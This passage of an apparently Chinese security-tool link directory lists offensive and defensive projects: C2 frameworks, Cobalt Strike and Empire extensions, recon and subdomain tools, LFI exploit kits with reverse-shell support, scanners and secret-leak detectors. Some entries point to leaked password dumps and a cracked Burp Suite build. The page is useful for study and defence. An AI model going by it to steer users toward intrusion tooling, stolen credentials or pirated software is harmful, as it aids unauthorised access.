href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a> metasploit 双星攻击利用文件</p></li><li><p><a href="https://github.com/darkoperator/Metasploit-Plugins">https://github.com/darkoperator/Metasploit-Plugins</a> msf 扩展资产搜集与帮助插件</p></li><li><p><a href="https://github.com/D4Vinci/One-Lin3r">https://github.com/D4Vinci/One-Lin3r</a> metasploit、payload 辅助查询工具</p></li><li><p><a href="https://github.com/shizzz477/msploitego">https://github.com/shizzz477/msploitego</a> 将 msf 数据库与 maltego 进行图形化展示</p></li><li><p><a href="https://github.com/scriptjunkie/msfgui">https://github.com/scriptjunkie/msfgui</a> metasploit 的 GUI 界面，话说现在 msf 对 windows 支持也挺好的</p></li></ul><h2 id="CobaltStrike-相关工具拓展插件"><a href="#CobaltStrike-相关工具拓展插件" class="headerlink" title="CobaltStrike 相关工具拓展插件#"></a><strong>CobaltStrike 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NDYxMTE5OA==&mid=2247483977&idx=1&sn=6e517a17a33a17c3e283030e26fdefbf&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg</a> 使用 Aggressor 脚本雕饰 Cobalt Strike</p></li><li><p><a href="https://github.com/rsmudge/armitage">https://github.com/rsmudge/armitage</a> CobaltStrike 社区版，调用 msf，一对多带界面</p></li><li><p><a href="https://github.com/anbai-inc/CobaltStrike_Hanization">https://github.com/anbai-inc/CobaltStrike_Hanization</a> CobaltStrike2.5 汉化版，以 msf 库为基础，3.0 以后改版</p></li><li><p><a href="https://github.com/rsmudge/cortana-scripts">https://github.com/rsmudge/cortana-scripts</a> 用于 cs2.x 与 armitage 的可拓展插件，cvs3.x 的为 AggressorScripts</p></li><li><p><a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a> cs3.0 以后的脚本搜集</p></li><li><p><a href="https://github.com/FortyNorthSecurity/AggressorAssessor">https://github.com/FortyNorthSecurity/AggressorAssessor</a> cs3.x 自动化攻击脚本集合</p></li><li><p><a href="https://github.com/Ridter/CS_Chinese_support/">https://github.com/Ridter/CS_Chinese_support/</a> cs3.0 传输信息的汉化插件</p></li><li><p><a href="https://github.com/verctor/CS_xor64">https://github.com/verctor/CS_xor64</a> 生成 cobaltstrike 所需的 xor64.bin</p></li><li><p><a href="https://github.com/ryhanson/ExternalC2">https://github.com/ryhanson/ExternalC2</a> 一个用于将通信渠道与 Cobalt Strike External C2 服务器集成的库</p></li><li><p><a href="https://github.com/threatexpress/cs2modrewrite">https://github.com/threatexpress/cs2modrewrite</a> 用于将 Cobalt Strike 配置文件转换为 mod_rewrite 脚本的工具</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/CatMyFish">https://github.com/Mr-Un1k0d3r/CatMyFish</a> 搜索分类域，为 Cobalt Strike beacon C&amp;C 设置白名单域</p></li><li><p><a href="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a> 利用 jquery 文件进行 C2 通讯，在文件内做了 JS 混淆绕过防火墙</p></li><li><p><a href="https://github.com/dcsync/pycobalt">https://github.com/dcsync/pycobalt</a> py3,Python API for Cobalt Strike</p></li><li><p><a href="https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html">https://www.cobaltstrike.com/aggressor-script/cobaltstrike.html</a> CobaltStrike 相关插件编写，一对多带界面</p></li></ul><h2 id="Empire-相关工具拓展插件"><a href="#Empire-相关工具拓展插件" class="headerlink" title="Empire 相关工具拓展插件#"></a><strong>Empire 相关工具拓展插件</strong>#</h2><ul><li><p><a href="https://paper.tuisec.win/detail/f3dce68a0b4baaa">https://paper.tuisec.win/detail/f3dce68a0b4baaa</a> 利用 Empire 获取域控权限</p></li><li><p><a href="https://github.com/EmpireProject/Empire-GUI">https://github.com/EmpireProject/Empire-GUI</a> empire 的 node.js 界面</p></li><li><p><a href="https://github.com/interference-security/empire-web">https://github.com/interference-security/empire-web</a> empire 的 web 界面</p></li><li><p><a href="https://github.com/byt3bl33d3r/DeathStar">https://github.com/byt3bl33d3r/DeathStar</a> py3,调用 Empire RESTful API 自动化获取域管权限的</p></li><li><p><a href="https://github.com/infosecn1nja/e2modrewrite">https://github.com/infosecn1nja/e2modrewrite</a> 用于将 Empire 配置文件转换为 Apache modrewrite 脚本</p></li><li><p><a href="https://github.com/maxchehab/CSS-Keylogging">https://github.com/maxchehab/CSS-Keylogging</a> Chrome 扩展程序和 Express 服务器利用 CSS 的键盘记录功能。</p></li><li><p><a href="https://github.com/evilcos/cookiehacker">https://github.com/evilcos/cookiehacker</a> Chrome 扩展程序。JavaScript document.cookie / Wireshark Cookie</p></li><li><p><a href="https://github.com/lfzark/cookie-injecting-tools">https://github.com/lfzark/cookie-injecting-tools</a> Chrome 扩展，cookie 注入工具包括注入，编辑，添加和删除 cookie</p></li></ul><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集#"></a><strong>信息搜集</strong>#</h2><ul><li><p><a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a> 利用 OSINT 自动化找出对方信息，gui 界面，插件化</p></li><li><p><a href="https://github.com/Nhoya/gOSINT">https://github.com/Nhoya/gOSINT</a> go，利用 OSINT 自动化搜集信息</p></li><li><p><a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> 企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts</p></li><li><p><a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> 通过爆破进行子域名获取，可用于查找子域名接管漏洞</p></li><li><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a> 通过搜索引擎与爆破快速子域枚举工具</p></li><li><p><a href="https://github.com/Ice3man543/subfinder">https://github.com/Ice3man543/subfinder</a> 基于 go 实现的 Sublist3r</p></li><li><p><a href="https://github.com/yanxiu0614/subdomain3">https://github.com/yanxiu0614/subdomain3</a> py3、py2 的子域名,IP,CDN 信息等</p></li><li><p><a href="https://github.com/caffix/amass">https://github.com/caffix/amass</a> 基于 go，子域名枚举, 搜索互联网数据源, 使用机器学习猜测子域名</p></li><li><p><a href="https://github.com/nahamsec/lazyrecon">https://github.com/nahamsec/lazyrecon</a> 侦查 reconnaissance 过程自动化脚本, 可自动使用 Sublist3r/certspotter 获取子域名, 调用 nmap/dirsearch 等</p></li><li><p><a href="https://github.com/s0md3v/ReconDog">https://github.com/s0md3v/ReconDog</a> simple，侦查信息的瑞士军刀</p></li><li><p><a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a> py3，爆破搜集子域名</p></li><li><p><a href="https://github.com/alpha1e0/pentestdb">https://github.com/alpha1e0/pentestdb</a> 多用途集成化信息搜集工具</p></li><li><p><a href="https://github.com/se55i0n/PortScanner">https://github.com/se55i0n/PortScanner</a> py2,目标 tcp 端口快速扫描、banner 识别、cdn 检测</p></li><li><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a> lijiejie 开发的一款使用广泛的子域名爆破枚举工具</p></li><li><p><a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a> 猪猪侠开发的一款域名收集全面、精准的子域名枚举工具</p></li><li><p><a href="https://github.com/n4xh4ck5/N4xD0rk">https://github.com/n4xh4ck5/N4xD0rk</a> 利用搜索引擎来搜集子域名，可以使用西班牙语搜集</p></li><li><p><a href="https://github.com/vysec/DomLink">https://github.com/vysec/DomLink</a> py2,调用 WHOXY.com，对邮箱和域名进行进一步的搜集</p></li><li><p><a href="https://github.com/jonluca/Anubis">https://github.com/jonluca/Anubis</a> py3.6，子域名爆破与信息搜集</p></li><li><p><a href="https://github.com/le4f/dnsmaper">https://github.com/le4f/dnsmaper</a> web 界面，子域名枚举爆破工具以及地图位置标记</p></li><li><p><a href="https://github.com/thewhiteh4t/seeker">https://github.com/thewhiteh4t/seeker</a> 获取高精度地理信息和设备信息的工具</p></li><li><p><a href="https://github.com/0xbug/orangescan">https://github.com/0xbug/orangescan</a> web 界面，的在线子域名信息收集工具</p></li><li><p><a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a> 扫描器中常用的子域名爆破 API 库</p></li><li><p><a href="https://github.com/We5ter/GSDF">https://github.com/We5ter/GSDF</a> 基于谷歌 SSL 透明证书的子域名查询脚本</p></li><li><p><a href="https://github.com/mandatoryprogrammer/cloudflare_enum">https://github.com/mandatoryprogrammer/cloudflare_enum</a> 利用 CloudFlare 的 dns 进行子域名枚举</p></li><li><p><a href="https://github.com/ultrasecurity/webkiller">https://github.com/ultrasecurity/webkiller</a> 渗透辅助，py，ip 信息、端口服务指纹、蜜罐探测、bypass cloudflare</p></li><li><p><a href="https://github.com/christophetd/CloudFlair">https://github.com/christophetd/CloudFlair</a> cloudflare 绕过，获取真实 ip，集成 censys</p></li><li><p><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> 多方式收集目标子域名信息</p></li><li><p><a href="https://github.com/code-scan/BroDomain">https://github.com/code-scan/BroDomain</a> 子域名查询</p></li><li><p><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a> 子域名枚举、探测工具。可用于子域名接管漏洞探测</p></li><li><p><a href="https://github.com/chuhades/dnsbrute">https://github.com/chuhades/dnsbrute</a> 基于 go，高效的子域名爆破工具</p></li><li><p><a href="https://github.com/evilsocket/dnssearch">https://github.com/evilsocket/dnssearch</a> 基于 go，一款子域名爆破工具</p></li><li><p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a> 基于 go，根据 dns 查询子域名和 web 目录爆破的工具</p></li><li><p><a href="https://github.com/reconned/domained">https://github.com/reconned/domained</a> 可用于子域名收集的一款工具</p></li><li><p><a href="https://github.com/bit4woo/Teemo">https://github.com/bit4woo/Teemo</a> 多方式域名收集及枚举工具</p></li><li><p><a href="https://github.com/swisskyrepo/Subdomino">https://github.com/swisskyrepo/Subdomino</a> 子域名枚举，端口扫描，服务存活确认</p></li><li><p><a href="https://github.com/nmalcolm/Inventus">https://github.com/nmalcolm/Inventus</a> 通过爬虫实现的子域名收集工具</p></li><li><p><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> 渗透辅助，php，exp 搜寻、payload 与 shell 生产、信息搜集</p></li><li><p><a href="https://github.com/chrismaddalena/ODIN">https://github.com/chrismaddalena/ODIN</a> py3，simple，信息搜集与后期漏洞利用</p></li><li><p><a href="https://github.com/x0day/bannerscan">https://github.com/x0day/bannerscan</a> C 段/旁站查询与路径扫描</p></li><li><p><a href="https://github.com/Xyntax/BingC">https://github.com/Xyntax/BingC</a> 基于 Bing 搜索引擎的 C 段/旁站查询，多线程，支持 API</p></li><li><p><a href="https://github.com/zer0h/httpscan">https://github.com/zer0h/httpscan</a> 网段 Web 主机发现小工具</p></li><li><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a> 网站信息泄漏批量扫描脚本</p></li><li><p><a href="https://github.com/aipengjie/sensitivefilescan">https://github.com/aipengjie/sensitivefilescan</a> 网站敏感文件扫描工具</p></li><li><p><a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a> 网站敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描</p></li><li><p><a href="https://github.com/Xyntax/FileSensor">https://github.com/Xyntax/FileSensor</a> 网站敏感文件探测工具</p></li><li><p><a href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a> 多线程网站泄露信息检测工具</p></li><li><p><a href="https://github.com/Viralmaniar/Passhunt">https://github.com/Viralmaniar/Passhunt</a> simple，用于搜索网络设备 Web 应用程序等的默认凭证。包含 523 个厂家的 2084 组默认密码</p></li><li><p><a href="https://github.com/yassineaboukir/Asnlookup">https://github.com/yassineaboukir/Asnlookup</a> simple,利用 ASN 搜索特定组织拥有 ip，可联动 nmap、masscan 进行进一步信息扫描</p></li></ul><h2 id="敏感信息泄露发现"><a href="#敏感信息泄露发现" class="headerlink" title="敏感信息泄露发现#"></a><strong>敏感信息泄露发现</strong>#</h2><ul><li><p><a href="https://github.com/Yelp/detect-secrets">https://github.com/Yelp/detect-secrets</a> PY,防止代码中的密码等相关敏感信息被提交到代码库中，可以在保证安全性的同时不会给开发者的生产力带来任何影响</p></li><li><p><a href="https://github.com/Acceis/leakScraper">https://github.com/Acceis/leakScraper</a> 处理和可视化大规模文本文件, 查找敏感信息, 例如证书</p></li><li><p><a href="https://github.com/Raikia/CredNinja">https://github.com/Raikia/CredNinja</a> 多线程用户凭证验证脚本，比如验证 dump 的 hash 是否属于此机器，利用 445 端口进行协议验证</p></li><li><p><a href="https://github.com/CERTCC/keyfinder">https://github.com/CERTCC/keyfinder</a> 查找并分析私钥/公钥文件(文件系统中), 支持 Android APK 文件</p></li><li><p><a href="https://github.com/Ice3man543/hawkeye">https://github.com/Ice3man543/hawkeye</a> go，cli 端，文件系统分析工具，快速查找文件内包含的 SSH 密钥，日志文件，Sqlite 数据库，密码文件等</p></li><li><p><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a> 获取目标网站截图、vnc、rdp 服务，尝试获取默认凭证</p></li><li><p><a href="https://github.com/D4Vinci/Cr3dOv3r">https://github.com/D4Vinci/Cr3dOv3r</a> 根据邮箱自动搜索泄漏的密码信息，也可测试账户密码在各大网站能否登录的工具</p></li></ul><h2 id="威胁情报分析"><a href="#威胁情报分析" class="headerlink" title="威胁情报分析#"></a><strong>威胁情报分析</strong>#</h2><ul><li><p><a href="https://www.databases.today,https//publicdbhost.dmca.gripe/%EF%BC%8Chttp://www.wttech.org/%EF%BC%8Chttps://hashes.org/leaks.php%EF%BC%8Chttps://archive.org/search.php?query=">https://www.databases.today，https://publicdbhost.dmca.gripe/，http://www.wttech.org/，https://hashes.org/leaks.php，https://archive.org/search.php?query=</a> 密码泄露</p></li><li><p><a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a> 威胁情报分析平台</p></li><li><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 微步在线 | 威胁情报分析平台-ThreatBook-多引擎在线扫描、恶意软件在线检测</p></li><li><p><a href="https://github.com/needmorecowbell/sniff-paste">https://github.com/needmorecowbell/sniff-paste</a> 针对 Pastebin 的开源情报收集工具</p></li><li><p><a href="https://talosintelligence.com/documents/ip-blacklist">https://talosintelligence.com/documents/ip-blacklist</a> 恶意 IP 地址</p></li><li><p><a href="https://ransomwaretracker.abuse.ch/downloads/RW_IPBL.txt">https://ransomwaretracker.abuse.ch/downloads/RW_IPBL.txt</a> 恶意软件 IP 地址</p></li><li><p><a href="https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1">https://check.torproject.org/cgi-bin/TorBulkExitList.py?ip=1.1.1.1</a> 洋葱路由出口节点</p></li><li><p><a href="https://isc.sans.edu/api/threatlist/shodan">https://isc.sans.edu/api/threatlist/shodan</a> shodan 撒旦扫描器节点</p></li><li><p><a href="https://github.com/Te-k/harpoon">https://github.com/Te-k/harpoon</a> 用于开源和威胁智能的 CLI 工具</p></li><li><p><a href="https://trumail.io/">https://trumail.io/</a> 验证对方邮箱是否为垃圾邮箱，每个月可以免费验证 1000 次</p></li><li><p><a href="https://github.com/ChrisJohnRiley/Scythe">https://github.com/ChrisJohnRiley/Scythe</a> 验证账号是否为常用账号</p></li><li><p><a href="https://github.com/fireeye/GeoLogonalyzer">https://github.com/fireeye/GeoLogonalyzer</a> 远程身份验证地理位置分析工具，用于区分合法登录和恶意登录。</p></li><li><p><a href="https://github.com/target/strelka">https://github.com/target/strelka</a> py3，通过实时扫描文件进行威胁情报分析和实时监测。</p></li></ul><h2 id="托管云安全"><a href="#托管云安全" class="headerlink" title="托管云安全#"></a><strong>托管云安全</strong>#</h2><ul><li><p><a href="https://github.com/stuhirst/awssecurity/blob/master/arsenal.md">https://github.com/stuhirst/awssecurity/blob/master/arsenal.md</a> AWS 安全检测相关的项目列表</p></li><li><p><a href="https://github.com/toniblyx/my-arsenal-of-aws-security-tools">https://github.com/toniblyx/my-arsenal-of-aws-security-tools</a> AWS 安全工具集</p></li><li><p><a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a> 扫描 amazon 公开的 S3 buckets 和 dump</p></li><li><p><a href="https://github.com/kromtech/s3-inspector">https://github.com/kromtech/s3-inspector</a> 检测亚马逊 AWS S3 bucket permissions</p></li><li><p><a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a> 枚举 AWS S3 buckets 以查找敏感机密的文件</p></li><li><p><a href="https://github.com/sa7mon/S3Scanner">https://github.com/sa7mon/S3Scanner</a> 扫描 amazon 公开的 S3 buckets 和 dump</p></li><li><p><a href="https://github.com/kromtech/s3-inspector">https://github.com/kromtech/s3-inspector</a> 检测亚马逊 AWS S3 bucket permissions</p></li><li><p><a href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump</a> 枚举 AWS S3 buckets 以查找敏感机密的文件</p></li><li><p><a href="https://github.com/Netflix/repokid">https://github.com/Netflix/repokid</a> AWS 最低权限策略部署工具</p></li><li><p><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a> AWS 漏洞检测框架</p></li><li><p><a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a> GitHub 泄露监控系统</p></li><li><p><a href="https://github.com/neal1991/gshark">https://github.com/neal1991/gshark</a> github 信息泄露检测</p></li><li><p><a href="https://github.com/VKSRC/Github-Monitor">https://github.com/VKSRC/Github-Monitor</a> GitHub 监控，代码信息泄露，分钟级监控，邮件预警</p></li><li><p><a href="https://github.com/metac0rtex/GitHarvester">https://github.com/metac0rtex/GitHarvester</a> github Repo 信息搜集工具</p></li><li><p><a href="https://github.com/repoog/GitPrey">https://github.com/repoog/GitPrey</a> GitHub 敏感信息扫描工具</p></li><li><p><a href="https://github.com/FeeiCN/GSIL">https://github.com/FeeiCN/GSIL</a> py3，近实时监控 Github 敏感信息，并发送告警通知。</p></li><li><p><a href="https://github.com/UnkL4b/GitMiner">https://github.com/UnkL4b/GitMiner</a> github 敏感内容挖掘</p></li><li><p><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a> GitHub 敏感信息扫描工具,包括检测 commit 等</p></li><li><p><a href="https://github.com/Hell0W0rld0/Github-Hunter">https://github.com/Hell0W0rld0/Github-Hunter</a> github 信息监测脚本</p></li><li><p><a href="https://github.com/awslabs/git-secrets">https://github.com/awslabs/git-secrets</a> 防止将敏感数据提交到 git 仓库的工具</p></li><li><p><a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a> 基于 go 的，检查 git repo 中的密码信息和密钥</p></li></ul><h2 id="目录路径发现"><a href="#目录路径发现" class="headerlink" title="目录路径发现#"></a><strong>目录路径发现</strong>#</h2><ul><li><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a> 经典目录路径扫描</p></li><li><p><a href="https://github.com/TheM4hd1/PenCrawLer">https://github.com/TheM4hd1/PenCrawLer</a> C#界面，web 爬虫与目录路径爆破工具，除了常规扫描增加了递归爆破模式</p></li><li><p><a href="https://github.com/Xyntax/DirBrute">https://github.com/Xyntax/DirBrute</a> 目录路径爆破工具</p></li><li><p><a href="https://github.com/abaykan/crawlbox">https://github.com/abaykan/crawlbox</a> 目录路径路径扫描器</p></li><li><p><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a> 目录路径路径扫描器</p></li><li><p><a href="https://github.com/UltimateHackers/Breacher">https://github.com/UltimateHackers/Breacher</a> 多线程的后台路径扫描器，也可用于发现 Execution After Redirect 漏洞</p></li><li><p><a href="https://github.com/fnk0c/cangibrina">https://github.com/fnk0c/cangibrina</a> 通过字典穷举、google、robots.txt 等途径的跨平台后台管理路径扫描器</p></li><li><p><a href="https://github.com/Go0s/SitePathScan">https://github.com/Go0s/SitePathScan</a> 基于协程的目录路径爆破工具，配合 aiohttp 扫描路径比之前快了三倍有余</p></li><li><p><a href="https://github.com/secfree/bcrpscan">https://github.com/secfree/bcrpscan</a> 基于爬虫的 web 路径扫描器</p></li></ul><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞#"></a><strong>本地文件包含漏洞</strong>#</h2><ul><li><p><a href="https://github.com/hvqzao/liffy">https://github.com/hvqzao/liffy</a> 本地文件包含漏洞利用工具</p></li><li><p><a href="https://github.com/D35m0nd142/Kadabra">https://github.com/D35m0nd142/Kadabra</a> 本地文件包含漏洞扫描和利用工具</p></li><li><p><a href="https://github.com/P0cL4bs/Kadimus">https://github.com/P0cL4bs/Kadimus</a> 本地文件包含漏洞扫描和利用工具</p></li><li><p><a href="https://github.com/D35m0nd142/LFISuite">https://github.com/D35m0nd142/LFISuite</a> 本地文件包含漏洞利用及扫描工具，支持反弹 shell</p></li><li><p><a href="https://github.com/OsandaMalith/LFiFreak">https://github.com/OsandaMalith/LFiFreak</a> 本地文件包含漏洞利用及扫描工具，支持反弹 shell</p></li></ul><h2 id="安全测试与扫描器框架"><a href="#安全测试与扫描器框架" class="headerlink" title="安全测试与扫描器框架#"></a><strong>安全测试与扫描器框架</strong>#</h2><ul><li><p><a href="https://github.com/zaproxy/zaproxy">https://github.com/zaproxy/zaproxy</a> The OWASP ZAP core project 出品的综合性渗透测试工具。由于其流量代理、请求重放和可扩展性拿来做模糊测试未尝不可</p></li><li><p><a href="https://github.com/x-Ai/BurpUnlimitedre">https://github.com/x-Ai/BurpUnlimitedre</a> burpsuite 1.7.27 的永久破解版</p></li><li><p><a href="https://github.com/andresriancho/w3af">https://github.com/andresriancho/w3af</a> 知名插件化扫描器</p></li><li><p><a href="https://github.com/juansacco/exploitpack">https://github.com/juansacco/exploitpack</a> 渗透测试集成框架，包含超过 38,000+ exploits</p></li><li><p><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a> Web 应用漏洞扫描框架,python3，300poc</p></li><li><p><a href="https://github.com/Xyntax/POC-T">https://github.com/Xyntax/POC-T</a> 渗透测试插件化扫描框架，自带 poc，并发扫描</p></li><li><p><a href="https://github.com/knownsec/Pocsuite">https://github.com/knownsec/Pocsuite</a> 知道创宇维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/leisurelicht/Pocsuite3">https://github.com/leisurelicht/Pocsuite3</a> Pocsuite 用 py3 重写</p></li><li><p><a href="https://github.com/Eitenne/roxysploit">https://github.com/Eitenne/roxysploit</a> 漏洞利用框架，支持永恒之蓝直接利用</p></li><li><p><a href="https://github.com/TophantTechnology/osprey">https://github.com/TophantTechnology/osprey</a> 斗象能力中心出品并长期维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/he1m4n6a/btScan">https://github.com/he1m4n6a/btScan</a> 大黑阔的插件化漏洞利用工具</p></li><li><p><a href="https://github.com/boy-hack/w9scan">https://github.com/boy-hack/w9scan</a> python 下内置 1200+插件可对网站进行一次规模的检测</p></li><li><p><a href="https://github.com/WooYun/TangScan">https://github.com/WooYun/TangScan</a> 乌云维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/n0tr00t/Beebeeto-framework">https://github.com/n0tr00t/Beebeeto-framework</a> Beebeeto 是由众多安全研究人员所共同维护的一个规范化 POC/EXP 利用框架</p></li><li><p><a href="https://github.com/erevus-cn/pocscan">https://github.com/erevus-cn/pocscan</a> 一款开源 Poc 调用框架,可轻松调用 Pocsuite,Tangscan,Beebeeto,Knowsec 老版本 POC，可使用 docker 部署</p></li><li><p><a href="https://github.com/DavexPro/PocHunter">https://github.com/DavexPro/PocHunter</a> 借鉴 pocscan 的一款多利用框架 poc 适配框架</p></li><li><p><a href="https://github.com/theInfectedDrake/TIDoS-Framework">https://github.com/theInfectedDrake/TIDoS-Framework</a> 覆盖从侦察到漏洞分析的所有内容</p></li><li><p><a href="https://github.com/gyoisamurai/GyoiThon">https://github.com/gyoisamurai/GyoiThon</a> 使用深度学习的渗透测试工具, 从每次扫描数据中学习, 扫描越多, 软件检测精准度越高</p></li><li><p><a href="https://github.com/euphrat1ca/polar-scan">https://github.com/euphrat1ca/polar-scan</a> 易语言的北极熊扫描器</p></li><li><p><a href="https://github.com/euphrat1ca/yeezy-scan">https://github.com/euphrat1ca/yeezy-scan</a> 椰树 1.9 扫描器</p></li><li><p><a href="https://github.com/euphrat1ca/WebCruiserWVS">https://github.com/euphrat1ca/WebCruiserWVS</a> 轻量级基于 C#的扫描器，椰树扫描器的前身</p></li><li><p><a href="https://github.com/Skycrab/leakScan">https://github.com/Skycrab/leakScan</a> web 界面，漏洞扫描</p></li><li><p><a href="https://github.com/az0ne/AZScanner">https://github.com/az0ne/AZScanner</a> web 界面，自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测</p></li><li><p><a href="https://github.com/boy-hack/w8scan">https://github.com/boy-hack/w8scan</a> web 界面，基于 bugscan 扫描和架构思想的扫描器</p></li><li><p><a href="https://github.com/MiniSafe/microweb">https://github.com/MiniSafe/microweb</a> web 界面，base bugscan，django</p></li><li><p><a href="https://github.com/taipan-scanner/Taipan">https://github.com/taipan-scanner/Taipan</a> web 界面，基于 F#与 C#的安全扫描器</p></li><li><p><a href="https://github.com/zhangzhenfeng/AnyScan">https://github.com/zhangzhenfeng/AnyScan</a> web 界面，python 漏洞扫描器</p></li><li><p><a href="https://github.com/Canbing007/wukong-agent">https://github.com/Canbing007/wukong-agent</a> web 界面，python 漏洞扫描器</p></li><li><p><a href="https://github.com/dermotblair/webvulscan">https://github.com/dermotblair/webvulscan</a> web 界面，php，漏洞扫描器，支持输出 pdf 报告</p></li><li><p><a href="https://github.com/jeffzh3ng/InsectsAwake">https://github.com/jeffzh3ng/InsectsAwake</a> web 界面，基于 Flask 应用框架的漏洞扫描系统，同时集成了渗透测试常用的端口扫描、子域名爆破等功能，后端漏洞扫描采用 Pocsuite</p></li><li><p><a href="https://github.com/0xInfection/TIDoS-Framework">https://github.com/0xInfection/TIDoS-Framework</a> py，linux，网站扫描器</p></li><li><p><a href="https://github.com/secdec/adapt">https://github.com/secdec/adapt</a> py,linux，网站扫描器</p></li><li><p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a> perl，linux，kali 内置的网站扫描器</p></li><li><p><a href="https://github.com/Ekultek/Zeus-Scanner">https://github.com/Ekultek/Zeus-Scanner</a> web 扫描器，联动 Geckodriver，nmap 和 sqlmap</p></li><li><p><a href="https://github.com/blackye/lalascan">https://github.com/blackye/lalascan</a> 集合 owasp top10 漏洞扫描和边界资产发现能力的分布式 web 漏洞扫描框架</p></li><li><p><a href="https://github.com/blackye/BkScanner">https://github.com/blackye/BkScanner</a> BkScanner 分布式、插件化 web 漏洞扫描器</p></li><li><p><a href="https://github.com/tlkh/prowler">https://github.com/tlkh/prowler</a> 一款基于 Raspberry Pi Cluster 的网络漏洞扫描工具</p></li><li><p><a href="https://github.com/netxfly/passive_scan">https://github.com/netxfly/passive_scan</a> 基于 http 代理的 web 漏洞扫描器</p></li><li><p><a href="https://github.com/1N3/Sn1per">https://github.com/1N3/Sn1per</a> php，自动化中间件扫描以及设备指纹识别</p></li><li><p><a href="https://github.com/Tuhinshubhra/RED_HAWK">https://github.com/Tuhinshubhra/RED_HAWK</a> php，集成信息收集、漏洞扫描、指纹识别等的扫描工具</p></li><li><p><a href="https://github.com/m4ll0k/Spaghetti">https://github.com/m4ll0k/Spaghetti</a> web 应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI 等漏洞扫描，也可直接用于 struts、ShellShock 等漏洞扫描</p></li><li><p><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> 支持检测 SQLi/XSS/LFI/RFI 等漏洞的扫描器</p></li><li><p><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> 集成子域名枚举、nmap、waf 指纹识别等模块的 web 应用扫描器</p></li><li><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> 定向自动测试工具</p></li><li><p><a href="https://github.com/Fireflyi/lcyscan">https://github.com/Fireflyi/lcyscan</a> py，插件化漏洞扫描器，支持生成报表</p></li><li><p><a href="https://github.com/Arachni/arachni">https://github.com/Arachni/arachni</a> Web 应用漏洞扫描框架，支持 REST、RPC 等 api 调用</p></li><li><p><a href="https://github.com/swisskyrepo/DamnWebScanner">https://github.com/swisskyrepo/DamnWebScanner</a> 基于 chrome/opera 插件的被动式漏洞扫描</p></li><li><p><a href="https://github.com/0xsauby/yasuo">https://github.com/0xsauby/yasuo</a> ruby,扫描主机第三方 web 应用服务漏洞</p></li><li><p><a href="https://github.com/yangbh/Hammer">https://github.com/yangbh/Hammer</a> Web 应用漏洞扫描</p></li><li><p><a href="https://github.com/viraintel/OWASP-Nettacker">https://github.com/viraintel/OWASP-Nettacker</a> 自动化渗透测试框架</p></li><li><p><a href="https://github.com/flipkart-incubator/watchdog">https://github.com/flipkart-incubator/watchdog</a> 全面的 web 扫描器与漏洞利用工具</p></li><li><p><a 